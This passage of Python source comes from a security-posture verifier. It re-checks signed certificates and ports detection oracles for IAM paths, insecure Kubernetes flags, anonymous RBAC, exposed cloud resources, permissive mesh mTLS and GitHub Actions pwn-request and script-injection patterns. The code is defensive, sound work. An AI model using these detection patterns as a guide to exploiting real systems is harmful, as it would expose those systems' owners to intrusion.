        return False, f"UNPINNED — supply the out-of-band posture fingerprint ({fp})"
    want = pin_s if pin_s.startswith("sha256:") else ("sha256:" + pin_s)
    if want.lower() != fp.lower():
        return False, f"posture trust-root pin MISMATCH — expected {want}, got {fp}"
    # 2. m-of-n signature over the canonical certificate bytes (+ digest-field integrity)
    msg = canonical_json(cert)
    want_digest = "sha256:" + sha256_hex(msg)
    if sig_env.get("scorecard_digest") is not None and sig_env.get("scorecard_digest") != want_digest:
        return False, "posture certificate digest field does not match the canonical bytes"
    ok, valid, reason = verify_threshold(msg, sig_env.get("signatures") or [], tr)
    if not ok:
        return False, f"posture signature: {reason}"
    # 3. coverage-projection binding (claims cannot drift from their evidence; no false CLOSED)
    try:
        rederived = _project_posture_claims(cert.get("coverage") or {})
    except ValueError as e:
        return False, f"posture coverage invalid: {e}"
    if rederived != cert.get("posture_claims"):
        return False, "posture_claims do not match the projection of the embedded coverage certificate"
    for c in rederived:
        if c["status"] == "CLOSED" and not c.get("evidence_oracle_kinds"):
            return False, "a CLOSED claim names no conclusive oracle"
    # 3a. S9c coverage-incomplete disclosure: a cert that declares an UNASSESSED surface must carry the
    #     downgraded overall verdict and cannot read as a clean whole-target CLOSED (no disclosure => no-op).
    _disc = cert.get("coverage_incomplete")
    if isinstance(_disc, dict) and _disc.get("incomplete"):
        _unassessed = _pp_normalize_incomplete(_disc.get("unassessed_surfaces"))
        if not _unassessed:
            return False, "coverage_incomplete is set but names no unassessed surface"
        _want = _pp_overall_verdict(cert.get("posture_claims") or [], _unassessed)
        _got = (cert.get("summary") or {}).get("overall")
        if _got != _want:
            return False, (f"posture overall verdict {_got!r} disagrees with the coverage-incomplete "
                           f"projection {_want!r} — a clean reading over an unassessed surface")
        if _got == "CLOSED":
            return False, "a coverage-incomplete certificate must not read CLOSED (whole-target)"
    # 3b. RE-EXECUTION (the re-executable tier): re-run the oracle over every re-executable probe's
    #     retained values and refuse a forged negative/positive — a tamper-check that re-derives the verdict
    #     (NOT a liveness proof; values are producer-supplied), run
    #     here with NO VIGIL installed. Binding-tier probes carry no kernel and are skipped (the H4
    #     residual). A claim marked "re-executable" whose clean probes carried no kernel would have
    #     failed the byte-for-byte projection binding above, so the tier label cannot be forged.
    rok, rreason = _reexecute_posture(cert.get("coverage") or {})
    if not rok:
        return False, f"posture re-execution: {rreason}"
    # 4. target binding (closes target-swap)
    iok, ireason = _verify_identity_attestation(cert.get("target_identity") or {}, owner_pubkey, engagement, now)
    if not iok:
        return False, f"posture target-binding: {ireason}"
    if not _identity_matches((cert.get("target_identity") or {}).get("policy") or {}, cert.get("target_sample") or {}):
        return False, "posture target_sample does not satisfy the owner's identity policy"
    s = cert.get("summary") or {}
    n_reexec = s.get("n_closed_re_executable", 0) or 0
    n_binding = s.get("n_closed_binding_only", s.get("n_closed", "?"))
    tier_note = (f"{n_reexec} CLOSED verdict(s) re-derived from retained evidence (re-executable tier; "
                 f"values are producer-supplied — trusting the negative reflects the live target needs a "
                 f"live re-run), "
                 f"{n_binding} binding-only (re-firing those needs VIGIL)")
    _incov = cert.get("coverage_incomplete")
    _incov_note = ""
    if isinstance(_incov, dict) and _incov.get("incomplete"):
        _names = "; ".join(f"{u.get('sensor')} (missing: {u.get('missing_prerequisite') or 'unknown'})"
                           for u in (_incov.get("unassessed_surfaces") or []))
        _incov_note = (f" — COVERAGE INCOMPLETE (overall={s.get('overall', 'COVERAGE_INCOMPLETE')}): "
                       f"declared surface(s) NOT ASSESSED: {_names}")
    return True, (f"SOUND: {s.get('n_closed', '?')} CLOSED / {s.get('n_open', '?')} OPEN / "
                  f"{s.get('n_unproven', '?')} UNPROVEN over {cert.get('target_sample')} — {tier_note}"
                  f"{_incov_note}")


# ---------------------------------------------------------------------------
# 8b. L3 — VIGIL-FREE ports of the SIX posture ORACLE bodies + a canonical-context reader.
#
# Each ``posture_*_fires`` is a faithful, byte-for-byte-semantic port of the corresponding oracle in
# ``framework.v2.verify.oracles`` (policy_path / k8s_posture / k8s_workload_posture / cloud_posture /
# mesh_posture / cicd_posture). A posture FACT retains, under its ``oracle_context``, exactly the observed
# control the oracle judges (``ctx["policy"]`` / ``ctx["k8s_control"]`` / … — see verify.adapter.from_* +
# verifier._run_oracle's dispatch). ``reexecute_posture_oracle`` re-fires the right one over that context
# with ZERO VIGIL import and returns the SAME fire/no-fire verdict the in-tree oracle would.
#
# These are the whole point of the L3 bar: a third party re-executes the posture check itself — not just the
# signature/binding — without VIGIL. A byte-for-byte differential test (integration/tests/test_vf_differential
# .py) pins every family to the in-tree oracle over both a FIRED and a HARDENED fixture.
#
# HONEST BOUND (identical to _reexecute_posture / the module header): the retained control is producer-
# supplied. Re-firing proves the verdict is the correct FUNCTION of the retained evidence — it does NOT
# prove the evidence reflects the live target (that still needs a VIGIL live re-run; and an OBSERVATION whose
# truth does not rest on the producer's word needs a channel-bound live capture).
# ---------------------------------------------------------------------------
def _pp_coerce_text(value: Any) -> str:
    """Byte-identical to oracles._coerce_text (the single text-coercion the posture oracles use)."""
    if value is None:
        return ""
    if isinstance(value, bytes):
        return value.decode("utf-8", errors="replace")
    if isinstance(value, str):
        return value
    return str(value)


# --- policy_path_oracle: an IAM grant PATH exists over the retained policy graph (BFS closure) -----------
_PP_ACCESS_LEVEL: dict[str, int] = {
    "list": 1, "read": 2, "get": 2, "describe": 2, "readonly": 2, "read_only": 2, "view": 2,
    "write": 3, "put": 3, "modify": 3, "update": 3, "delete": 3, "create": 3,
    "read_write": 3, "readwrite": 3,
    "admin": 4, "owner": 4, "full": 4, "root": 4, "all": 4, "*": 4, "manage": 4,
}


def _pp_norm_id(value: Any) -> str:
    return str(value or "").strip().lower()


def _pp_access_level(access: Any) -> int:
    a = str(access or "").strip().lower().replace("-", "_")
    if not a:
        return 1
    return _PP_ACCESS_LEVEL.get(a, 2)


def _pp_access_grants(granted: Any, requested: Any) -> bool:
    if not str(requested or "").strip():
        return True
    return _pp_access_level(granted) >= _pp_access_level(requested)


def posture_policy_path_fires(observed_policy: Any) -> bool:
    """Port of oracles.policy_path_oracle (fire iff a grant path exists). BFS from the query principal over
    the assume/member_of closure; fire iff some reachable principal holds a grant over the resource whose
    access dominates the requested access (empty access = any grant path). (Adjacency/grant SORTING in the
    oracle only makes the reconstructed PATH deterministic — it never changes WHETHER a hit exists — so the
    fired verdict is byte-identical without it.)"""
    if not isinstance(observed_policy, Mapping):
        return False
    start = _pp_norm_id(observed_policy.get("principal"))
    target = _pp_norm_id(observed_policy.get("resource"))
    requested = str(observed_policy.get("access") or "").strip()
    if not start or not target:
        return False
    adj: dict[str, list[str]] = {}
    for rel_key in ("assume", "member_of"):
        for e in observed_policy.get(rel_key) or []:
            if not isinstance(e, Mapping):
                continue
            src, dst = _pp_norm_id(e.get("src")), _pp_norm_id(e.get("dst"))
            if src and dst:
                adj.setdefault(src, []).append(dst)
    grants: dict[str, list[tuple[str, str]]] = {}
    for g in observed_policy.get("grants") or []:
        if not isinstance(g, Mapping):
            continue
        p, r = _pp_norm_id(g.get("principal")), _pp_norm_id(g.get("resource"))
        if p and r:
            grants.setdefault(p, []).append((r, str(g.get("access") or "")))
    order = [start]
    seen = {start}
    i = 0
    while i < len(order):
        cur = order[i]
        i += 1
        for res, acc in grants.get(cur, ()):
            if res == target and _pp_access_grants(acc, requested):
                return True
        for nxt in adj.get(cur, ()):
            if nxt not in seen:
                seen.add(nxt)
                order.append(nxt)
    return False


# --- k8s_posture_oracle: a kube-bench control hard-FAILED with a concrete insecure --flag ---------------
_PP_K8S_VALUE_CAP = 8192
_PP_INSECURE_SETTING_RULES: tuple["re.Pattern[str]", ...] = (
    re.compile(r"(?i)--anonymous-auth[=:\s]+true\b"),
    re.compile(r"(?i)--authorization-mode[=:\s]+\S*alwaysallow"),
    re.compile(r"(?i)--insecure-port[=:\s]+0*[1-9]\d*"),
    re.compile(r"(?i)--read-only-port[=:\s]+0*[1-9]\d*"),
    re.compile(r"(?i)--basic-auth-file[=:\s]+\S+"),
    re.compile(r"(?i)--token-auth-file[=:\s]+\S+"),
    re.compile(r"(?i)--client-cert-auth[=:\s]+false\b"),
    re.compile(r"(?i)--profiling[=:\s]+true\b"),
)


def posture_k8s_fires(observed_control: Any) -> bool:
    """Port of oracles.k8s_posture_oracle: fire iff status is a hard FAIL AND the retained actual_value
    literally carries a recognised dangerous flag. WARN/PASS/INFO, an empty value, or a value showing the
    SECURE setting all do not fire."""
    if not isinstance(observed_control, Mapping):
        return False
    status = _pp_coerce_text(observed_control.get("status")).strip().upper()
    actual = _pp_coerce_text(observed_control.get("actual_value"))[:_PP_K8S_VALUE_CAP]
    if status != "FAIL" or not actual.strip():
        return False
    return any(pattern.search(actual) is not None for pattern in _PP_INSECURE_SETTING_RULES)


# --- k8s_workload_posture_oracle: an anonymous subject bound to a dangerous built-in ClusterRole --------
_PP_K8S_WL_STR_CAP = 4096
_PP_K8S_ANON_SUBJECTS = frozenset({"system:anonymous", "system:unauthenticated"})
_PP_K8S_DANGEROUS_ROLES = frozenset({"cluster-admin", "admin", "edit"})
_PP_K8S_RBAC_APIGROUP = "rbac.authorization.k8s.io"


def _pp_k8s_norm(value: Any) -> str:
    return _pp_coerce_text(value)[:_PP_K8S_WL_STR_CAP].strip().lower()


def _pp_k8s_subject_is_anon(s: Any) -> bool:
    """Port of oracles._k8s_subject_is_anon: a TYPED subject {kind,name,api_group} is anon only when a User is
    named system:anonymous / a Group named system:unauthenticated AND the RBAC apiGroup is present (required
    for an unapplied manifest); a legacy STRING subject (live-read) matches by the bare reserved name."""
    if isinstance(s, Mapping):
        # kind/name/apiGroup are compared EXACTLY (case- and whitespace-sensitive); mirrors oracles.py so the
        # L3 re-verifier and the in-tree oracle agree (a padded/case-variant subject is a DIFFERENT principal).
        if _pp_coerce_text(s.get("api_group") or s.get("apiGroup")) != _PP_K8S_RBAC_APIGROUP:
            return False
        kind = _pp_coerce_text(s.get("kind"))
        name = _pp_coerce_text(s.get("name"))
        return (kind == "User" and name == "system:anonymous") or \
               (kind == "Group" and name == "system:unauthenticated")
    # Legacy STRING subject (live-read): match EXACTLY (mirrors oracles.py — the reserved names are always
    # lowercase; a case/whitespace variant is a different principal).
    return _pp_coerce_text(s) in _PP_K8S_ANON_SUBJECTS


def posture_k8s_workload_fires(observed_control: Any) -> bool:
    """Port of oracles.k8s_workload_posture_oracle: fire iff a subject is system:anonymous /
    system:unauthenticated AND the bound role is a dangerous built-in ClusterRole (cluster-admin / admin /
    edit) in the RBAC apiGroup (a non-ClusterRole kind or non-RBAC apiGroup is rejected; empty is tolerated
    for hand-authored evidence)."""
    if not isinstance(observed_control, Mapping):
        return False
    ctl = observed_control
    state = ctl.get("achieved_state") if isinstance(ctl.get("achieved_state"), Mapping) else ctl
    raw_subjects = state.get("subjects")
    subjects = raw_subjects if isinstance(raw_subjects, (list, tuple)) else []
    # The roleRef NAME is case- AND whitespace-SENSITIVE in k8s; match the built-in EXACTLY (a case/whitespace
    # variant like "Cluster-Admin" is a DISTINCT custom role, not the built-in). Mirrors oracles.py exactly so
    # the L3 re-verifier and the in-tree oracle agree (test_vf_differential pins them together).
    role_name = _pp_coerce_text(state.get("role"))[:_PP_K8S_WL_STR_CAP]
    role_kind = _pp_k8s_norm(state.get("role_kind"))
    role_apigroup = _pp_k8s_norm(state.get("role_apigroup"))
    anon = any(_pp_k8s_subject_is_anon(s) for s in subjects)
    dangerous = (role_name in _PP_K8S_DANGEROUS_ROLES
                 and role_kind in ("clusterrole", "")
                 and role_apigroup in ("rbac.authorization.k8s.io", ""))
    return bool(anon and dangerous)


# --- cloud_posture_oracle: encryption-at-rest-disabled / public-exposure / wildcard-principal -----------
_PP_CLOUD_STR_CAP = 4096
_PP_CLOUD_MAX_PRINCIPALS = 4096
_PP_CLOUD_COMPLIANT_STATUSES = frozenset({
    "pass", "passed", "ok", "compliant", "pass_manual", "info", "informational", "not_applicable",
    "na", "n/a", "skipped", "manual",
})
_PP_CLOUD_ANON_PRINCIPALS = frozenset({
    "*", "allusers", "anonymous", "public", "everyone", "authenticatedusers", "allauthenticatedusers",
    "principal:*", "arn:aws:iam::*:root", "**",
})


def _pp_cloud_tri_bool(value: Any) -> Optional[bool]:
    if isinstance(value, bool):
        return value
    if isinstance(value, int) and not isinstance(value, bool):
        return bool(value)
    if isinstance(value, str):
        v = value.strip().lower()
        if v in ("true", "1", "yes", "on", "enabled", "enable"):
            return True
        if v in ("false", "0", "no", "off", "disabled", "disable"):
            return False
    return None


def _pp_cloud_norm_principal(p: Any) -> str:
    return _pp_coerce_text(p)[:_PP_CLOUD_STR_CAP].strip().lower().replace("-", "").replace("_", "")


def _pp_cloud_is_anon_principal(p: Any) -> bool:
    norm = _pp_cloud_norm_principal(p)
    return norm in {a.replace("-", "").replace("_", "") for a in _PP_CLOUD_ANON_PRINCIPALS}


def _pp_cloud_achieved_state(control: Mapping[str, Any]) -> dict[str, Any]:
    src = control.get("achieved_state") if isinstance(control.get("achieved_state"), Mapping) else control
    principals: list[str] = []
    raw_principals = src.get("principals")
    if isinstance(raw_principals, (list, tuple)):
        principals.extend(_pp_coerce_text(p) for p in raw_principals[:_PP_CLOUD_MAX_PRINCIPALS])
    grants = src.get("grants")
    if isinstance(grants, (list, tuple)):
        for g in grants[:_PP_CLOUD_MAX_PRINCIPALS]:
            if isinstance(g, Mapping) and g.get("principal") is not None:
                principals.append(_pp_coerce_text(g.get("principal")))
    return {
        "encrypted": _pp_cloud_tri_bool(src.get("encrypted")),
        "public": _pp_cloud_tri_bool(src.get("public")),
        "sensitive": _pp_cloud_tri_bool(src.get("sensitive")),
        "principals": principals,
    }


def posture_cloud_fires(observed_control: Any) -> bool:
    """Port of oracles.cloud_posture_oracle (fixed rule order): an EXPLICIT compliant status never fires;
    otherwise fire iff (1) encrypted is explicitly false AND sensitive is explicitly true, OR (2) public is
    explicitly true, OR (3) a wildcard/anonymous principal is named in the retained policy. Absent/unknown
    flags never fire."""
    if not isinstance(observed_control, Mapping):
        return False
    status = _pp_coerce_text(observed_control.get("status")).strip().lower()
    if status in _PP_CLOUD_COMPLIANT_STATUSES:
        return False
    state = _pp_cloud_achieved_state(observed_control)
    if state["encrypted"] is False and state["sensitive"] is True:
        return True
    if state["public"] is True:
        return True
    return any(_pp_cloud_is_anon_principal(p) for p in state["principals"])


# --- mesh_posture_oracle: permissive-mtls / authz-allow-all / linkerd-unauthenticated -------------------
_PP_MESH_STR_CAP = 4096
_PP_MESH_MAX_RULES = 4096
_PP_MESH_PERMISSIVE_MTLS = frozenset({"permissive", "disable"})
_PP_MESH_UNAUTH_INBOUND = frozenset({"all-unauthenticated", "all_unauthenticated"})
_PP_MESH_ANON_PRINCIPALS = frozenset({"*"})
_PP_MESH_COMPLIANT_STATUSES = frozenset({
    "pass", "passed", "ok", "compliant", "info", "informational", "not_applicable",
    "na", "n/a", "skipped", "manual",
})


def _pp_mesh_authz_allows_all(action: Any, rules: Any) -> bool:
    """Port of oracles._mesh_authz_allows_all (the boolean half). ALLOW/unset action AND a rule matching
    everyone: an empty catch-all rule, or a `*` PEER principal in a from.source.principals clause
    (requestPrincipals `*` is deliberately NOT allow-all — it requires a valid JWT)."""
    act = _pp_coerce_text(action).strip().upper() or "ALLOW"
    if act != "ALLOW":
        return False
    if not isinstance(rules, (list, tuple)):
        return False
    for rule in list(rules)[:_PP_MESH_MAX_RULES]:
        if not isinstance(rule, Mapping):
            continue
        froms, tos, whens = rule.get("from"), rule.get("to"), rule.get("when")
        if not froms and not tos and not whens:
            return True
        if isinstance(froms, (list, tuple)):
            for f in froms:
                if not isinstance(f, Mapping):
                    continue
                src = f.get("source")
                if not isinstance(src, Mapping):
                    continue
                vals = src.get("principals")
                if isinstance(vals, (list, tuple)) and any(
                        _pp_coerce_text(v).strip() in _PP_MESH_ANON_PRINCIPALS for v in vals):
                    return True
    return False


def posture_mesh_fires(observed_control: Any) -> bool:
    """Port of oracles.mesh_posture_oracle (fixed rule order): an EXPLICIT compliant status never fires;
    otherwise fire iff (1) effective mTLS mode is PERMISSIVE/DISABLE, OR (2) an ALLOW AuthorizationPolicy
    admits every caller, OR (3) a Linkerd default-inbound-policy is all-unauthenticated."""
    if not isinstance(observed_control, Mapping):
        return False
    ctl = observed_control
    status = _pp_coerce_text(ctl.get("status")).strip().lower()
    if status in _PP_MESH_COMPLIANT_STATUSES:
        return False
    mtls_mode = _pp_coerce_text(ctl.get("mtls_mode")).strip().lower()
    if mtls_mode in _PP_MESH_PERMISSIVE_MTLS:
        return True
    if _pp_mesh_authz_allows_all(ctl.get("action"), ctl.get("rules")):
        return True
    inbound = _pp_coerce_text(ctl.get("default_inbound_policy") or ctl.get("inbound_policy")).strip().lower()
    return inbound in _PP_MESH_UNAUTH_INBOUND


# --- cicd_posture_oracle: unpinned-action / pwn-request / script-injection ------------------------------
_PP_CICD_VALUE_CAP = 8192
_PP_SHA40_RE = re.compile(r"^[0-9a-fA-F]{40}$")
_PP_CICD_FIRST_PARTY = frozenset({"actions", "github"})
_PP_ACTION_REF_RE = re.compile(r"^([^/@\s]+)/([^@\s]+)@(\S+)$")
_PP_QUOTED_LIT_RE = re.compile(r"'[^']*'|\"[^\"]*\"")
_PP_UNTRUSTED_CTX_RES: tuple["re.Pattern[str]", ...] = tuple(re.compile(p, re.I) for p in (
    r"(?<![\w.])github\.head_ref(?![\w.])",
    r"(?<![\w.])github\.event\.issue\.(?:title|body)(?![\w.])",
    r"(?<![\w.])github\.event\.pull_request\.(?:title|body)(?![\w.])",
    r"(?<![\w.])github\.event\.pull_request\.head\.(?:ref|label)(?![\w.])",
    r"(?<![\w.])github\.event\.comment\.body(?![\w.])",
    r"(?<![\w.])github\.event\.(?:review|review_comment)\.body(?![\w.])",
    r"(?<![\w.])github\.event\.discussion\.(?:title|body)(?![\w.])",
    r"(?<![\w.])github\.event\.head_commit\.(?:message|author\.(?:name|email))(?![\w.])",
    r"(?<![\w.])github\.event\.commits(?:\[[^\]]*\]|\.\*)?\.(?:message|author\.(?:name|email))(?![\w.])",
    r"(?<![\w.])github\.event\.pages(?:\[[^\]]*\]|\.\*)?\.page_name(?![\w.])",
))
_PP_UNTRUSTED_PR_CHECKOUT_RE = re.compile(
    r"(?i)(github\.event\.pull_request\.head\.(?:sha|ref)|github\.head_ref|refs/pull/)")
_PP_INTERP_RE = re.compile(r"\$\{\{(.+?)\}\}", re.S)


def posture_cicd_fires(observed_control: Any) -> bool:
    """Port of oracles.cicd_posture_oracle: fire per the retained ``rule`` — unpinned_action (a third-party
    owner/repo@ref pinned to a MUTABLE ref, i.e. not SHA-40, not first-party/local/docker), pwn_request
    (pull_request_target checking out the UNTRUSTED PR head), or script_injection (a `run:` body
    interpolating an untrusted github.event.* / github.head_ref expression, quoted literals stripped). An
    unrecognised rule never fires."""
    if not isinstance(observed_control, Mapping):
        return False
    ctl = observed_control
    rule = _pp_coerce_text(ctl.get("rule")).strip().lower()

    if rule == "unpinned_action":
        uses = _pp_coerce_text(ctl.get("uses"))[:_PP_CICD_VALUE_CAP].strip()
        m = _PP_ACTION_REF_RE.match(uses)
        if m is None:
            return False
        owner, ref = m.group(1), m.group(3)
        if owner.lower() in _PP_CICD_FIRST_PARTY or uses.startswith("./") or uses.startswith("docker://"):
            return False
        if _PP_SHA40_RE.match(ref):
            return False
        return True

    if rule == "pwn_request":
        trigger = _pp_coerce_text(ctl.get("trigger")).strip().lower()
        checkout = _pp_coerce_text(ctl.get("checkout_ref"))[:_PP_CICD_VALUE_CAP]
        if trigger != "pull_request_target":
            return False
        return _PP_UNTRUSTED_PR_CHECKOUT_RE.search(checkout) is not None

    if rule == "script_injection":
        run = _pp_coerce_text(ctl.get("run"))[:_PP_CICD_VALUE_CAP]
        for m in _PP_INTERP_RE.finditer(run):
            body = _PP_QUOTED_LIT_RE.sub(" ", m.group(1))   # a quoted literal never dereferences a context
            if any(rx.search(body) is not None for rx in _PP_UNTRUSTED_CTX_RES):
                return True
        return False

    return False


# --- the canonical-context reader: dispatch a posture oracle_context to its ported oracle ----------------
# (surface_key -> ported oracle, kind label). Mirrors verifier._run_oracle's posture dispatch: a posture
# FACT retains exactly ONE of these keys (the observed control the oracle judges). First present wins.
_POSTURE_ORACLE_DISPATCH: tuple[tuple[str, Any, str], ...] = (
    ("policy", posture_policy_path_fires, "policy_path"),
    ("k8s_control", posture_k8s_fires, "k8s_posture"),
    ("k8s_workload_control", posture_k8s_workload_fires, "k8s_workload_posture"),
    ("cloud_control", posture_cloud_fires, "cloud_posture"),
    ("mesh_control", posture_mesh_fires, "mesh_posture"),
    ("cicd_control", posture_cicd_fires, "cicd_posture"),
)


def reexecute_posture_oracle(oracle_context: Any) -> tuple[Optional[bool], str]:
    """VIGIL-FREE re-execution of a posture FACT's ``oracle_context``. Reads the canonical retained context
    (as produced by verify.adapter.FindingContext.to_verifier_context), picks the first present posture key,
    re-fires the ported standalone oracle over its retained observed control, and returns (fired, kind).
    Returns (None, "") when the context carries no posture key (nothing to re-fire standalone).

    This is the L3 bar: a third party re-executes the posture CHECK itself, ZERO VIGIL import, and gets the
    same fire/no-fire verdict the in-tree oracle would. HONEST BOUND: the retained values are producer-
    supplied — this proves the verdict↔evidence binding, NOT that the evidence is live (needs a live re-run)."""
    if not isinstance(oracle_context, Mapping):
        return None, ""
    for key, fn, kind in _POSTURE_ORACLE_DISPATCH:
        if key in oracle_context:
            return bool(fn(oracle_context[key])), kind
    return None, ""




# ---------------------------------------------------------------------------
# 8c. L3-GENERAL — VIGIL-FREE ports of the PURE, STDLIB-ONLY general oracle bodies
#     + a canonical-context reader that re-fires them over a retained oracle_context.
#
# The posture tier (section 8b) and the predicate kernel (section 8) re-execute the
# posture + achieved-state ACHIEVED_STATE oracles standalone. This section extends that to the
# GENERAL (non-posture, non-predicate) oracle set whose bodies are PURE and STDLIB-ONLY — the
# web-vuln differential / statistical / structural families. Each ``*_oracle`` below is a
# BYTE-FOR-BYTE copy of the corresponding body in ``framework.v2.verify.oracles`` (extracted by
# AST over its exact source + the transitive closure of its pure module-level helpers; the
# closure is provably stdlib-only — see the parity harness integration/tests/
# test_general_reexecutable.py, which pins every ported class to the in-tree oracle on BOTH
# ``fired`` AND ``conclusive`` over a representative retained-evidence battery).
#
# The two shims below (``OracleKind`` string constants + an ``OracleSignal`` dataclass that
# reproduces the Pydantic model's ``fired -> conclusive`` coercion) let the oracle bodies compile
# UNCHANGED with zero VIGIL import — the whole point: a third party re-derives these general FACT
# verdicts with nothing installed (stdlib + the one Ed25519 lib this file already uses).
#
# WHAT THIS DOES (Step 2 of the audit package — see docs/limitations/inventory.json
# LIMIT-audit-package-reproduction): for a FACT whose retained ``oracle_context`` carries one of
# the ported families' keys, ``reexecute_general_oracle`` re-RUNS the deterministic oracle and
# returns the SAME fire/no-fire + conclusive verdict the in-tree oracle would — so the audit
# package no longer merely binds the verdict, it RE-DERIVES it standalone.
#
# HONEST BOUND (identical to the posture tier): re-firing proves the verdict is the correct
# FUNCTION of the retained evidence — it does NOT prove the retained evidence reflects the live
# target (that still needs an in-VIGIL live re-run). Two sets are NOT ported here (both named in
# LIMIT-audit-package-reproduction, and their split enforced by test_general_reexecutable.py::
# test_bucket_classification_is_enforced): the GENUINELY-IRREDUCIBLE oracles whose import-closure
# needs a module outside stdlib + cryptography (version_range -> packaging; saml_forgery ->
# signxml/lxml; oob_callback -> the framework verify.oob receipt crypto backing an EXTERNAL
# collector); and a PURE-BUT-NOT-YET-PORTED residual whose bodies ARE re-fireable with stdlib +
# cryptography (follow-up work). Both rest, for now, on the signature + an in-VIGIL re-run (the
# sound maximum), never faked as reproduced.
# ---------------------------------------------------------------------------
class OracleKind:
    """String-valued stand-in for ``framework.v2.verify.models.OracleKind`` (the ``.value`` of each
    member). The ported bodies only read ``OracleKind.X`` to stamp a signal's kind; parity is on
    ``fired``/``conclusive``, so the string value is sufficient and keeps the bodies byte-identical."""
    DIFFERENTIAL_RESPONSE = "differential_response"
    TIMING = "timing"
    BOOLEAN_INFERENCE = "boolean_inference"
    SIDE_EFFECT = "side_effect"
    REFLECTION_CONTEXT = "reflection_context"
    EVALUATION = "evaluation"
    ERROR_SIGNATURE = "error_signature"
    SANITIZER_SIGNAL = "sanitizer_signal"
    SYSTEM_PROMPT_DISCLOSURE = "system_prompt_disclosure"
    PROMPT_INJECTION = "prompt_injection"
    PROTOTYPE_POLLUTION = "prototype_pollution"
    SQL_INJECTION_BREAKOUT = "sql_injection_breakout"
    COMMAND_INJECTION_BREAKOUT = "command_injection_breakout"
    NOSQL_INJECTION_BREAKOUT = "nosql_injection_breakout"
    TLS_WEAKNESS = "tls_weakness"


@dataclass
class OracleSignal:
    """Stand-in for ``framework.v2.verify.models.OracleSignal`` carrying exactly the fields the
    ported bodies set, and reproducing the model's ``_fired_implies_conclusive`` validator (a FIRED
    signal is always conclusive). Parity is asserted on ``fired`` AND ``conclusive``."""
    kind: Any
    fired: bool
    confidence: float = 0.0
    evidence: str = ""
    observed: dict = field(default_factory=dict)
    conclusive: bool = False

    def __post_init__(self) -> None:
        if self.fired and not self.conclusive:
            self.conclusive = True


# --- the byte-faithful ported oracle bodies + their pure stdlib helper closure ------------------
_VOID_ELEMENTS = frozenset({
    "area", "base", "br", "col", "embed", "hr", "img", "input",
    "link", "meta", "param", "source", "track", "wbr",
})


@dataclass(frozen=True)
class _Response:
    status: int | None
    body: str
    latency_ms: float | None


def _coerce_text(value: Any) -> str:
    if value is None:
        return ""
    if isinstance(value, bytes):
        return value.decode("utf-8", errors="replace")
    if isinstance(value, str):
        return value
    return str(value)


def _normalize_response(value: Any) -> _Response:
    """Accept a plain string/bytes body, or a mapping with any of
    {status|status_code, body|text|content, latency_ms|elapsed_ms}."""
    if isinstance(value, Mapping):
        status = value.get("status", value.get("status_code"))
        body = value.get("body", value.get("text", value.get("content", "")))
        latency = value.get("latency_ms", value.get("elapsed_ms"))
        return _Response(
            status=int(status) if status is not None else None,
            body=_coerce_text(body),
            latency_ms=float(latency) if latency is not None else None,
        )
    return _Response(status=None, body=_coerce_text(value), latency_ms=None)


def _json_signature(obj: Any, prefix: str = "") -> set[tuple[str, str]]:
    """The set of (json-pointer path, value-TYPE) pairs in a JSON document.
    Records structure, not values — so a changed timestamp/nonce (same path,
    same type) is invisible, but a new/removed record (a new path) shows."""
    out: set[tuple[str, str]] = set()
    if isinstance(obj, dict):
        out.add((prefix or "/", "object"))
        for k in obj:
            out |= _json_signature(obj[k], f"{prefix}/{k}")
    elif isinstance(obj, list):
        out.add((prefix or "/", "array"))
        for i, v in enumerate(obj):
            out |= _json_signature(v, f"{prefix}/{i}")
    else:
        out.add((prefix or "/", type(obj).__name__))
    return out


class _TagPathCounter(HTMLParser):
    """Builds a multiset of ancestor-tag-paths (e.g. ``html>body>table>tr``) over
    a document, using stdlib parsing only. The multiset is invariant to text/
    attribute values, so token noise does not move it, but an added element does."""

    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self._stack: list[str] = []
        self.counter: Counter[str] = Counter()

    def handle_starttag(self, tag: str, attrs: object) -> None:
        self._stack.append(tag)
        self.counter[">".join(self._stack)] += 1
        if tag in _VOID_ELEMENTS:
            self._stack.pop()

    def handle_startendtag(self, tag: str, attrs: object) -> None:
        self._stack.append(tag)
        self.counter[">".join(self._stack)] += 1
        self._stack.pop()

    def handle_endtag(self, tag: str) -> None:
        if tag in self._stack:
            while self._stack and self._stack[-1] != tag:
                self._stack.pop()
            if self._stack:
                self._stack.pop()


def _parse_structure(body: str) -> tuple[str, Any]:
    """Return ('json', path-type set) or ('html', tag-path multiset). JSON is
    tried first; anything else is parsed as HTML with the stdlib parser (no
    third-party dependency). A parse failure degrades to ('text', None) so the
    caller can skip cleanly."""
    import json as _json

    text = body if isinstance(body, str) else _coerce_text(body)
    stripped = text.lstrip()
    if stripped[:1] in "{[":
        try:
            return "json", _json_signature(_json.loads(text))
        except (ValueError, TypeError):
            pass
    parser = _TagPathCounter()
    try:
        parser.feed(text)
        parser.close()
    except Exception:
        return "text", None
    if not parser.counter:
        return "text", None
    return "html", parser.counter


def structural_diff(baseline_body: Any, mutated_body: Any) -> float:
    """A structure-aware divergence score in [0, 1], invariant to token noise
    (CSRF tokens, nonces, timestamps) and sensitive to real change (an added
    record, an extra ``<tr>``, a new form). 0 = structurally identical.

    JSON: symmetric difference of (path, type) sets over their union. HTML:
    multiset difference of tag-paths over the total. Different document kinds
    (JSON vs HTML) score 1.0. Unparseable bodies score 0.0 (no structural
    claim — the lexical dimension still applies)."""
    kind_b, sig_b = _parse_structure(baseline_body)
    kind_m, sig_m = _parse_structure(mutated_body)
    if kind_b == "text" or kind_m == "text":
        return 0.0
    if kind_b != kind_m:
        return 1.0
    if kind_b == "json":
        union = sig_b | sig_m
        return (len(sig_b ^ sig_m) / len(union)) if union else 0.0
    # html multisets
    diff = sum((sig_b - sig_m).values()) + sum((sig_m - sig_b).values())
    total = sum(sig_b.values()) + sum(sig_m.values())
    return (diff / total) if total else 0.0


def _noisy_or(weights: list[float]) -> float:
    """Combine independent evidence weights: 1 - prod(1 - w). Clamped to 0.99
    so a deterministic oracle never claims certainty it cannot have."""
    product = 1.0
    for w in weights:
        product *= 1.0 - max(0.0, min(1.0, w))
    return min(0.99, 1.0 - product)


_DEFAULT_DIFFERENTIAL_DIMENSIONS = frozenset({"status", "length", "lexical", "marker"})


def differential_response_oracle(
    baseline: Any,
    mutated: Any,
    discriminator: Mapping[str, Any] | str | None = None,
) -> OracleSignal:
    """Distinguish two observed responses.

    For a boolean-based blind bug the "true" condition yields a materially
    different response than the "false"/baseline condition; this oracle
    quantifies that divergence lexically and structurally. For a time-based
    blind bug a latency delta over threshold is the signal.

    discriminator (all optional):
